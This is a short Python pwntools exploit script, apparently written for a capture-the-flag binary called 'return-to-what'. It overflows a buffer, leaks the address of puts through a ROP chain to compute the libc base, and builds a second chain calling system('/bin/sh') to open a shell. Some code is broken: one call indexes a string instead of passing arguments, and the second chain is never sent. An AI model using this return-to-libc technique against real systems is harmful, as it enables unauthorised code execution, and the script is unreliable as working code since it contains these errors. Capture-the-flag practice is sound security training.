#!/usr/bin/env python

from pwn import *
#from pprint import pprint

context.arch = 'amd64'
offset = 56
elf = ELF("./return-to-what")
p = elf.process()
#p = remote("chal.duc.ctf",30003)
rop = ROP(elf)
rop.call("puts"[elf.got['puts']])
rop.call("vuln") 
print(p.recvuntil("\n"))
print(p.recvuntil("\n"))

payload = [
	b"A"*offset,
	#p64(elf.symbols['vuln'])
	rop.chain()
]
payload = b"".join(payload)
with open("payload", "wb") as h:
	h.write(payload)
p.sendline(payload)
puts = p.recvuntil("\n").rstrip().ljust(8, b"\x00")
log.info(f"puts found at {hex(puts)}")
libc = ELF("libc_downloaded_function")
libc.address = puts - libc.symbols["puts"]
log.info(f"libc base address is {hex(libc.address)}")

rop = ROP(libc)
rop.call("puts", [ next(libc.search(b"/bin/sh\x00")) ])
rop.call("system", [ next(libc.search(b"/bin/sh\x00")) ])
rop.call("exit")
p.interactive()
#pprint(elf)
#pprint(elf.symnols)

